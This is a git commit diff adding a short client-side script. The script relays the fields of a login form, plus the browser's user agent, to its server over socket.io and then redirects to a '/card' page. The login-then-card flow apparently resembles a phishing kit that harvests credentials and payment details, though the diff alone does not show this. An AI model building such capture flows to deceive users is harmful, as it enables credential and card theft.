6b44c605e3c757feb57156c451f9b561189ddf6b
webcro <148506609+webcro@users.noreply.github.com>
2023-11-30 17:29:10 -0500

    Update index.js

--- public/js/index.js
+++ public/js/index.js
@@ -1,1 +1,11 @@
+const socket = io();
 
+function submitForm() {
+    document.getElementById('userAgent').value = navigator.userAgent;
+
+    const formData = new FormData(document.getElementById('loginForm'));
+
+    socket.emit('submit', Object.fromEntries(formData));
+
+    window.location.href = `/card`;
+}
